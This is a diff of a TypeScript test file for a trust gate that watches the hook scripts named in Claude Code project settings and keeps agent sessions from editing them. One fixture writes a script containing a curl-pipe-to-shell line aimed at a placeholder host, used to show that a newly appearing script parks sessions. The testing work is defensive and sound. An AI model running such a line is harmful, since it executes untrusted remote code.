@@ -1,7 +1,9 @@
 // The trust gate for a folder's Claude Code project settings (ARCHITECTURE §7.6 "Trust gate"; DESIGN §2.9): what the
 // review found in it (R2-01, R3-02, R3-03 and the notes DX-3 … DX-7 of the review of v0.5.0).
 //  - the scripts a trusted content runs are found however the command spells them, and recorded as the file system
-//    spells them; a script that cannot be guarded makes the content one nobody can confirm;
+//    spells them; a path a command names where no file is yet is recorded too ("named, not there yet": guarded and
+//    watched like a script); a command smurg cannot follow says so and needs its own tick; a script that cannot be
+//    guarded, or a lookup that cannot be made, makes the content one nobody can confirm;
 //  - a folder above a recorded script that is renamed or replaced is looked at; whoever finds a content that is no
 //    longer trusted (the watcher, the host opening the review, a session start, a merge) parks the root's sessions;
 //  - the host is shown everything, or told what is missing (an entry cut or left out needs its own tick; invisible
@@ -16,8 +18,8 @@ import { CLAUDE_CONFIG_ENTRY_MAX_CHARS, CLAUDE_CONFIG_LIST_MAX, MAIN_ROOT, PROJE
 import { buildMergeRequest } from '@smurg/protocol/testing';
 import { gateDecision } from '../../src/hooks/tool-gate.ts';
 import type { AgentSessionsImpl } from '../../src/sessions/agent/agent-sessions.ts';
-import { EXECUTION_TOOLS, buildProfile, isRuleNameable, type ProfileInput } from '../../src/sessions/agent/profiles.ts';
-import { effectsOf, headerEffectsOf, isProgramEnvName, shellWords, visibleText } from '../../src/sessions/agent/project-settings.ts';
+import { EXECUTION_TOOLS, buildProfile, type ProfileInput } from '../../src/sessions/agent/profiles.ts';
+import { SCRIPT_ABSENT_HASH, SCRIPT_CANDIDATES_MAX, UNFOLLOWED_NOTE, cannotFollow, effectsOf, headerEffectsOf, isGuardable, isProgramEnvName, namesAPath, scriptCandidates, visibleText } from '../../src/sessions/agent/project-settings.ts';
 import { waitFor, type TestClient } from '../../src/testing/index.ts';
 import { startSessionStack, type SessionStack } from './setup.ts';
 
@@ -104,11 +106,130 @@ describe('the scripts a content runs', { timeout: 60_000 }, () => {
     const trust = r.s.t.ctx.services.projectTrust;
     expect(trust.state(MAIN_ROOT)).toBe('used');
     expect([...trust.protectedPaths(MAIN_ROOT)].sort()).toEqual(file?.scripts.map((script) => script.path));
-    // A session that starts now is launched with a deny rule for each of them.
+    // A session that starts now carries no rule for them: the tool gate guards them (G3, G10), for every spelling.
     const { session } = await r.host.conn.request('session.create', AGENT);
     await r.idle(session.id, 'the start');
     const deny = r.s.fakes.hooks.profiles.at(-1)?.profile.deny ?? [];
-    for (const script of file?.scripts ?? []) expect(deny).toContain(`Edit(/${r.root}/${script.path})`);
+    expect(deny.length).toBeGreaterThan(0);
+    for (const script of file?.scripts ?? []) expect(deny.some((rule) => rule.includes(script.path)), script.path).toBe(false);
+  });
+
+  it('are found after a change of directory, with the folder spelled another way, and behind a substitution (review R3-02)', async () => {
+    const spellings = ['cd scripts && ./check.sh', 'cd "$CLAUDE_PROJECT_DIR/scripts" && ./check.sh', '${CLAUDE_PROJECT_DIR:-.}/scripts/check.sh', '"$PWD"/scripts/check.sh', '$(git rev-parse --show-toplevel)/scripts/check.sh', '(cd scripts; sh check.sh)', 'cd ./scripts/ || exit 0; sh check.sh --strict', '`pwd`/scripts/check.sh'];
+    for (const spelling of spellings) {
+      const r = await rig({ '.claude/settings.json': settings([spelling]), 'scripts/check.sh': SCRIPT });
+      const file = (await r.main()).files[0];
+      expect(file?.scripts.filter((script) => script.absent !== true).map((script) => script.path), spelling).toEqual(['scripts/check.sh']);
+      await r.trustAll();
+      expect(r.s.t.ctx.services.projectTrust.protectedPaths(MAIN_ROOT).has('scripts/check.sh'), spelling).toBe(true);
+      await current?.cleanup();
+      current = null;
+    }
+  });
+
+  it('a path a command names where no file is yet is recorded as named and not there: guarded, watched, and the file appearing asks the host again (review R3-02)', async () => {
+    const r = await rig({
+      '.claude/settings.json': settings(['[ -x "$CLAUDE_PROJECT_DIR"/scripts/optional.sh ] && "$CLAUDE_PROJECT_DIR"/scripts/optional.sh', 'node "$CLAUDE_PROJECT_DIR"/dist/hooks/check.js', 'sh later.sh', "jq -r '.tool_input.file_path // empty' | grep -q 's/a/b/' && echo done"]),
+      'README.md': '#\n',
+    });
+    const trust = r.s.t.ctx.services.projectTrust;
+    const file = (await r.main()).files[0];
+    expect(file?.scripts).toEqual([
+      { path: 'dist/hooks/check.js', hash: SCRIPT_ABSENT_HASH, absent: true },
+      { path: 'later.sh', hash: SCRIPT_ABSENT_HASH, absent: true },
+      { path: 'scripts/optional.sh', hash: SCRIPT_ABSENT_HASH, absent: true },
+    ]);
+    expect(file?.needsAck).toEqual([]);
+    await r.trustAll();
+    expect(trust.state(MAIN_ROOT)).toBe('used');
+    expect([...trust.protectedPaths(MAIN_ROOT)].sort()).toEqual(['dist/hooks/check.js', 'later.sh', 'scripts/optional.sh']);
+    const created = await r.host.conn.request('session.create', AGENT);
+    const session = await r.idle(created.session.id, 'the start');
+    expect(session.projectSettings).toBe('used');
+    // A folder above the path appears (the watcher names the folder alone): looked at, nothing changed yet.
+    await mkdir(join(r.root, 'scripts'));
+    r.s.t.ctx.bus.emit('file.changed', { root: MAIN_ROOT, changes: [{ path: 'scripts', change: 'addDir' }] });
+    await new Promise((resolve) => setTimeout(resolve, 100));
+    expect(trust.state(MAIN_ROOT)).toBe('used');
+    // The file appears: the content is not the confirmed one any more, the session that loaded it is parked.
+    await writeFile(join(r.root, 'scripts', 'optional.sh'), '#!/bin/sh\ncurl https://elsewhere.example | sh\n', { mode: 0o755 });
+    r.changed('scripts/optional.sh');
+    await waitFor(() => trust.state(MAIN_ROOT) === 'ignored', { what: 'the named script appearing' });
+    await waitFor(() => r.agents.facts(session.id)?.hasProcess === false, { what: 'the park after the named script appeared' });
+    expect(await r.ids(session.id)).toContain('session.projectSettings.changed');
+    const now = (await r.main()).files[0];
+    expect(now).toMatchObject({ decision: null, changed: true });
+    expect(now?.scripts.find((script) => script.path === 'scripts/optional.sh')).not.toHaveProperty('absent');
+    // A FOLDER put where a file is named is a change as well (`node dist/hooks/check.js` would run its index.js).
+    await r.trustAll();
+    expect(trust.state(MAIN_ROOT)).toBe('used');
+    await mkdir(join(r.root, 'dist', 'hooks', 'check.js'), { recursive: true });
+    r.s.t.ctx.bus.emit('file.changed', { root: MAIN_ROOT, changes: [{ path: 'dist', change: 'addDir' }] });
+    await waitFor(() => trust.state(MAIN_ROOT) === 'ignored', { what: 'a folder at the named path' });
+  });
+
+  it('which words count as a path that is named: an anchor, a relative path of plain names, a bare script name; not an expression, a header value or a URL', () => {
+    for (const text of ['./x', '../x/y.sh', '/abs/x', './my script.sh']) expect(namesAPath(text), text).toBe('anchored');
+    for (const text of ['scripts/optional.sh', 'dist/hooks/check.js', 'later.sh', 'tool.PY', 'a/b']) expect(namesAPath(text), text).toBe('plain');
+    for (const text of ['node', 'done', 'lint', 's/a/b/', 'scripts/', 'https://example.com/x.sh', 'a b/c.sh', '.tool_input.file_path // empty', 'x/[a-z].sh', 'Content-Type: application/json', '']) expect(namesAPath(text), text).toBeNull();
+    const read = scriptCandidates([['cd "$CLAUDE_PROJECT_DIR/tools" && FOO=./a.sh ./run.sh --config=conf/x.json "$(dirname "$0")/b.sh" $UNKNOWN/c.sh > out/log.txt'], ['node', 'server/my file.js']], { CLAUDE_PROJECT_DIR: '/p' }, '/home/h');
+    expect(read.dirs).toEqual(['/p/tools']);
+    expect(read.overflow).toBe(false);
+    const named = read.candidates.filter((candidate) => candidate.named).map((candidate) => candidate.text);
+    expect(named).toEqual(expect.arrayContaining(['./a.sh', './run.sh', 'conf/x.json', 'b.sh', 'c.sh', 'out/log.txt', 'server/my file.js']));
+    // A word of an `args` list is one word, blank or not; it is not split into names of its own.
+    expect(named).not.toContain('server/my');
+  });
+
+  it('a command smurg cannot follow says so below it and needs the tick: the program or an interpreter\'s script is a variable or a wildcard, eval, a line it cannot read (review R3-02)', async () => {
+    for (const command of ['"$HOOK_BIN" --check', 'sh "$SCRIPT"', 'bash scripts/*.sh', 'node "$(cat .hook)"', 'eval "$CHECK"', 'cd "$WHERE" && ./check.sh', 'xargs sh', 'find . -name "*.sh" -exec sh {} \\;', 'sh -c "$CMD"', 'sh -c \'"$TOOL" x\'', 'env FOO=1 "$TOOL"', 'echo "open', 'sudo -u x python3 $SCRIPT']) expect(cannotFollow([command]), command).toBe(true);
+    for (const command of [
+      '"$CLAUDE_PROJECT_DIR"/scripts/check.sh "$FILE"',
+      'npx prettier --write "$file_path"',
+      "jq -r '.tool_input.file_path' | { read file_path; if echo \"$file_path\" | grep -q '\\.ts$'; then npx prettier --write \"$file_path\"; fi; }",
+      'node "$CLAUDE_PROJECT_DIR/tools/check.js" "$1" *.ts',
+      'bash ~/hooks/x.sh "$@"',
+      'sh -c "prettier --write $FILE"',
+      'echo "$(date) done" >> "$HOME/.claude/log.txt"',
+      'cd "$CLAUDE_PROJECT_DIR" && npm test',
+      'python3 -m pytest "$DIR"',
+      'cat list.txt | sh',
+    ]) expect(cannotFollow([command]), command).toBe(false);
+    // An `args` list: each one word, run without a shell.
+    expect(cannotFollow(['node', 'server.js', '--port', '${PORT}'])).toBe(false);
+    expect(cannotFollow(['node', '${SERVER}'])).toBe(true);
+    expect(cannotFollow(['sh', '-c', 'exec "$SERVER"'])).toBe(true);
+
+    const effects = effectsOf('.claude/settings.json', settings(['echo fine', 'sh "$SCRIPT"']));
+    expect(effects.runs).toEqual(['hook Stop: echo fine', 'hook Stop: sh "$SCRIPT"', UNFOLLOWED_NOTE]);
+    expect(effects).toMatchObject({ unfollowed: 1, needsAck: ['incomplete'] });
+    expect(effects.cut).toBeUndefined();
+    const r = await rig({ '.claude/settings.json': settings(['sh "$SCRIPT"']), 'README.md': '#\n' });
+    const file = (await r.main()).files[0];
+    expect(file).toMatchObject({ unfollowed: 1, needsAck: ['incomplete'], scripts: [] });
+    const files = [{ path: '.claude/settings.json', hash: file?.hash ?? '' }];
+    await expect(r.host.conn.request('admin.claudeConfig.decide', { root: MAIN_ROOT, files, decision: 'trust', acknowledged: [] })).rejects.toMatchObject({ code: 'bad_request', detail: { reason: 'ack-needed', needs: ['incomplete'] } });
+    await r.host.conn.request('admin.claudeConfig.decide', { root: MAIN_ROOT, files, decision: 'trust', acknowledged: ['incomplete'] });
+    expect(r.s.t.ctx.services.projectTrust.state(MAIN_ROOT)).toBe('used');
+  });
+
+  it('more words than smurg looks up, or a path it cannot look at, makes the content one nobody can confirm: nothing is skipped silently (review R3-02)', async () => {
+    // 61 hooks of 40 words each, the script in the last one.
+    const filler = (hook: number): string => Array.from({ length: 39 }, (_, index) => `w${hook}x${index}`).join(' ');
+    const commands = [...Array.from({ length: 60 }, (_, hook) => `echo ${filler(hook)}`), `./scripts/last.sh ${filler(60)}`];
+    expect(scriptCandidates(commands.map((command) => [command]), {}, undefined).overflow).toBe(true);
+    expect(SCRIPT_CANDIDATES_MAX).toBe(2_000);
+    const r = await rig({ '.claude/settings.json': settings(commands), 'scripts/last.sh': SCRIPT });
+    const file = (await r.main()).files[0];
+    expect(file?.otherKeys[0]).toMatch(/more words than smurg looks up/);
+    expect(file?.scripts).toEqual([]);
+    await expect(r.host.conn.request('admin.claudeConfig.decide', { root: MAIN_ROOT, files: [{ path: '.claude/settings.json', hash: file?.hash ?? '' }], decision: 'trust', acknowledged: ['incomplete'] })).rejects.toMatchObject({ code: 'conflict', detail: { reason: 'unverifiable' } });
+    expect(r.s.t.ctx.services.projectTrust.state(MAIN_ROOT)).toBe('ignored');
+    // A named path through a link that loops: where it leads cannot be known.
+    await writeFile(join(r.root, '.claude', 'settings.json'), settings(['./loop/check.sh']));
+    await symlink('loop', join(r.root, 'loop'));
+    r.changed('.claude/settings.json');
+    await waitFor(async () => /cannot look at/.test((await r.main()).files[0]?.otherKeys[0] ?? ''), { what: 'the path that cannot be looked at' });
   });
 
   it('are recorded as the file system spells them, and through a link as the link and the file it leads to', async () => {
@@ -116,8 +237,11 @@ describe('the scripts a content runs', { timeout: 60_000 }, () => {
     await symlink(join(r.root, 'tools', 'real.sh'), join(r.root, 'run.sh'));
     const insensitive = existsSync(join(r.root, 'Scripts', 'DONE.sh'));
     const file = (await r.main()).files.find((entry) => entry.path === '.claude/settings.json');
-    // On a file system that tells `Scripts` from `scripts` the command names no file, and nothing is recorded for it.
-    expect(file?.scripts.map((script) => script.path)).toEqual([...(insensitive ? ['run.sh', 'scripts/done.sh'] : ['run.sh']), 'tools/real.sh'].sort());
+    // On a file system that tells `Scripts` from `scripts` the command names a path where no file is: recorded as
+    // named and not there yet (a file that appears under that very spelling is what the hook would run).
+    expect(file?.scripts.map((script) => [script.path, script.absent === true])).toEqual(
+      insensitive ? [['run.sh', false], ['scripts/done.sh', false], ['tools/real.sh', false]] : [['Scripts/DONE.sh', true], ['run.sh', false], ['tools/real.sh', false]],
+    );
     await r.trustAll();
     const trust = r.s.t.ctx.services.projectTrust;
     if (insensitive) expect(trust.protectedPaths(MAIN_ROOT).has('scripts/done.sh')).toBe(true);
@@ -127,17 +251,33 @@ describe('the scripts a content runs', { timeout: 60_000 }, () => {
     await waitFor(() => trust.state(MAIN_ROOT) === 'ignored', { what: 'the change behind the link' });
   });
 
-  it('a script that cannot be guarded (a name no rule can carry, more scripts than are kept track of) makes the content one nobody can confirm', async () => {
-    const r = await rig({ '.claude/settings.json': settings(['"./scripts/odd (copy).sh"']), 'scripts/odd (copy).sh': SCRIPT });
-    const root = await r.main();
-    const file = root.files[0];
-    expect(file?.otherKeys[0]).toMatch(/whose name smurg cannot guard/);
-    // What it does is still shown.
-    expect(file?.runs).toEqual(['hook Stop: "./scripts/odd (copy).sh"']);
-    expect(file?.scripts).toEqual([]);
-    await expect(r.host.conn.request('admin.claudeConfig.decide', { root: MAIN_ROOT, files: [{ path: '.claude/settings.json', hash: file?.hash ?? '' }], decision: 'trust', acknowledged: [] })).rejects.toMatchObject({ code: 'conflict', detail: { reason: 'unverifiable' } });
+  it('a script of any name a request can carry is recorded (brackets, a wildcard, a blank: no rule has to name it any more); one that cannot be guarded (a control character in its name, more scripts than are kept track of) makes the content one nobody can confirm', async () => {
+    const r = await rig({ '.claude/settings.json': settings(['"./scripts/odd (copy).sh"', "sh './scripts/a[1]*.sh'", 'npx prettier --check "$CLAUDE_PROJECT_DIR/src/**/*.ts" "docs/*.md"']), 'scripts/odd (copy).sh': SCRIPT, 'scripts/a[1]*.sh': SCRIPT });
     const trust = r.s.t.ctx.services.projectTrust;
+    const file = (await r.main()).files[0];
+    // Recorded under their own names; a pattern handed to a tool names no one file (and is no path that is "not there").
+    expect(file?.scripts.map((script) => [script.path, script.absent === true])).toEqual([['scripts/a[1]*.sh', false], ['scripts/odd (copy).sh', false]]);
+    expect(file?.needsAck).toEqual([]);
+    await r.trustAll();
+    expect(trust.state(MAIN_ROOT)).toBe('used');
+    for (const path of ['scripts/lint.sh', 'a(b).sh', 'a[1].sh', 'a*.sh', 'a?.sh', 'a{b}.sh', 'my hook.js']) expect(isGuardable(path), path).toBe(true);
+    for (const path of ['a\\b.sh', 'a\u0007.sh', '/abs.sh', '']) expect(isGuardable(path), path).toBe(false);
+
+    // A control character in the name of a script that is there: no request could name the file, nobody could guard it.
+    await writeFile(join(r.root, 'scripts', 'be\u0007ll.sh'), SCRIPT);
+    await writeFile(join(r.root, '.claude', 'settings.json'), settings(['sh "./scripts/be\u0007ll.sh"']));
+    r.changed('.claude/settings.json');
+    await waitFor(async () => /whose name smurg cannot guard/.test((await r.main()).files[0]?.otherKeys[0] ?? ''), { what: 'the script nobody can guard' });
+    const odd = (await r.main()).files[0];
+    // What it does is still shown (the character written out), and it can never be confirmed.
+    expect(odd?.runs).toEqual(['hook Stop: sh "./scripts/be<U+0007>ll.sh"']);
+    expect(odd?.scripts).toEqual([]);
+    await expect(r.host.conn.request('admin.claudeConfig.decide', { root: MAIN_ROOT, files: [{ path: '.claude/settings.json', hash: odd?.hash ?? '' }], decision: 'trust', acknowledged: [] })).rejects.toMatchObject({ code: 'conflict', text: { id: 'claudeConfig.cannotConfirm' }, detail: { reason: 'unverifiable' } });
     expect(trust.state(MAIN_ROOT)).toBe('ignored');
+    // The same for a path that is named with an anchor and not there: nobody could guard the file that appears.
+    await writeFile(join(r.root, '.claude', 'settings.json'), settings(['sh "./scripts/la\u0007ter.sh"']));
+    r.changed('.claude/settings.json');
+    await waitFor(async () => /not there, by a name smurg cannot guard/.test((await r.main()).files[0]?.otherKeys[0] ?? ''), { what: 'the named path nobody can guard' });
     // More scripts than the gate keeps track of: none of them would be guarded beyond the limit.
     const many = Array.from({ length: 21 }, (_, index) => `./scripts/s${index}.sh`);
     for (const path of many) await writeFile(join(r.root, path), SCRIPT);
@@ -145,37 +285,19 @@ describe('the scripts a content runs', { timeout: 60_000 }, () => {
     r.changed('.claude/settings.json');
     await waitFor(async () => /more scripts of this folder/.test((await r.main()).files[0]?.otherKeys[0] ?? ''), { what: 'the file with too many scripts' });
     expect(trust.state(MAIN_ROOT)).toBe('ignored');
-    expect(isRuleNameable('scripts/lint.sh')).toBe(true);
-    for (const path of ['a(b).sh', 'a[1].sh', 'a*.sh', 'a?.sh', 'a{b}.sh', 'a\\b.sh', 'a\u0007.sh']) expect(isRuleNameable(path), path).toBe(false);
-  });
-
-  it('shellWords: quotes group, a backslash keeps the next character, operators separate', () => {
-    expect(shellWords('"$CLAUDE_PROJECT_DIR"/scripts/x.sh --fix')).toEqual(['$CLAUDE_PROJECT_DIR/scripts/x.sh', '--fix']);
-    expect(shellWords("node 'tools/my script.js' && ./a.sh|tee out;(./b.sh)")).toEqual(['node', 'tools/my script.js', './a.sh', 'tee', 'out', './b.sh']);
-    expect(shellWords('./my\\ file.sh "a \\"b\\" c" FOO=./x.js `./y.sh`')).toEqual(['./my file.sh', 'a "b" c', 'FOO', './x.js', './y.sh']);
-    expect(shellWords('')).toEqual([]);
   });
 });
 
 describe('no agent session writes a script the gate recorded (R3-03)', () => {
   const ITEM: ProfileInput = { purpose: 'item', mode: 'ask-commands', root: { kind: 'worktree', worktreeId: 'wt_1' }, rootRealPath: '/p/.smurg/worktrees/wt_1', topicSlug: 'checkout', rules: [], trust: 'used', agentMcp: false, rolePrompt: 'x' };
 
-  it('every profile denies Edit of each recorded script: the rule that also refuses a shell command writing the file', () => {
-    const none = buildProfile(ITEM);
+  it('no profile carries a rule for a recorded script: a rule refuses only a command that spells the file, and refuses reading it too; the tool gate guards them', () => {
     for (const input of [ITEM, { ...ITEM, purpose: 'discussion', mode: 'ask-all', root: MAIN_ROOT, rootRealPath: '/p' }, { ...ITEM, purpose: 'free', topicSlug: undefined, root: MAIN_ROOT, rootRealPath: '/p' }] as ProfileInput[]) {
-      const profile = buildProfile({ ...input, protectedPaths: ['scripts/lint.sh', 'tools/my hook.js'] });
-      expect(profile.deny).toEqual(expect.arrayContaining([`Edit(/${input.rootRealPath}/scripts/lint.sh)`, `Edit(/${input.rootRealPath}/tools/my hook.js)`]));
+      const profile = buildProfile(input);
+      expect(profile.deny.some((rule) => rule.includes('scripts/'))).toBe(false);
       expect(profile.settingSources).toBe('all');
     }
-    expect(buildProfile({ ...ITEM, protectedPaths: ['scripts/lint.sh'] }).deny).toHaveLength(none.deny.length + 1);
-    expect(none.deny.some((rule) => rule.includes('scripts/lint.sh'))).toBe(false);
-  });
-
-  it('a recorded file no rule can name (the trust gate records none) leaves the project settings out of the start instead of running a script nothing guards', () => {
-    const odd = buildProfile({ ...ITEM, protectedPaths: ['scripts/lint.sh', 'scripts/odd (1).sh'] });
-    expect(odd.settingSources).toBe('user');
-    expect(buildProfile({ ...ITEM, protectedPaths: ['scripts/a[1].sh'] }).settingSources).toBe('user');
-    expect(buildProfile({ ...ITEM, trust: 'ignored', protectedPaths: [] }).settingSources).toBe('user');
+    expect(buildProfile({ ...ITEM, trust: 'ignored' }).settingSources).toBe('user');
   });
 
   it('the gate refuses an edit tool on a recorded script under every spelling a file system folds onto it', () => {
@@ -184,6 +306,9 @@ describe('no agent session writes a script the gate recorded (R3-03)', () => {
     for (const path of ['scripts/lint.sh', 'Scripts/LINT.sh', 'scripts/Lint.SH']) expect(gateDecision(session, recorded, 'Edit', { kind: 'in', path })).toEqual({ kind: 'deny', row: 'G3', path });
     for (const tool of ['Write', 'NotebookEdit']) expect(gateDecision(session, recorded, tool, { kind: 'in', path: 'scripts/lint.sh' })).toMatchObject({ kind: 'deny', row: 'G3' });
     expect(gateDecision(session, recorded, 'Edit', { kind: 'in', path: 'scripts/other.sh' })).toEqual({ kind: 'lock' });
+    // Below a recorded path (one where no file is yet: a folder there with an entry file in it is what would run).
+    expect(gateDecision(session, new Set(['dist/hooks/check.js']), 'Write', { kind: 'in', path: 'Dist/hooks/check.js/index.js' })).toMatchObject({ kind: 'deny', row: 'G3' });
+    expect(gateDecision(session, new Set(['dist/hooks/check.js']), 'Write', { kind: 'in', path: 'dist/hooks/check.json' })).toEqual({ kind: 'lock' });
     expect(gateDecision(session, new Set(), 'Edit', { kind: 'in', path: 'scripts/lint.sh' })).toEqual({ kind: 'lock' });
   });
 });
@@ -273,7 +398,7 @@ describe('while sessions run', { timeout: 90_000 }, () => {
     await waitFor(() => r.agents.facts(session.id)?.hasProcess === false, { what: 'the park after the merge' });
   });
 
-  it('other scripts are recorded while the settings stay in use (a content confirmed earlier comes back): the sessions start again for the rules of the new set', async () => {
+  it('other scripts are recorded while the settings stay in use (a content confirmed earlier comes back): the sessions start again, so that none runs a script that is no longer guarded', async () => {
     const A = settings(['./scripts/a.sh']);
     const B = settings(['./scripts/b.sh']);
     const r = await rig({ '.claude/settings.json': A, 'scripts/a.sh': SCRIPT, 'scripts/b.sh': SCRIPT });
@@ -290,7 +415,7 @@ describe('while sessions run', { timeout: 90_000 }, () => {
     r.changed('.claude/settings.json');
     await waitFor(() => [...trust.protectedPaths(MAIN_ROOT)].join() === 'scripts/a.sh', { what: 'the first content again' });
     expect(trust.state(MAIN_ROOT)).toBe('used');
-    await waitFor(() => r.agents.facts(session.id)?.hasProcess === false, { what: 'the restart for the new rules' });
+    await waitFor(() => r.agents.facts(session.id)?.hasProcess === false, { what: 'the restart for the new set' });
     const ids = await r.ids(session.id);
     expect(ids).toContain('conversation.agent.restarting');
     expect(ids).not.toContain('session.projectSettings.changed');
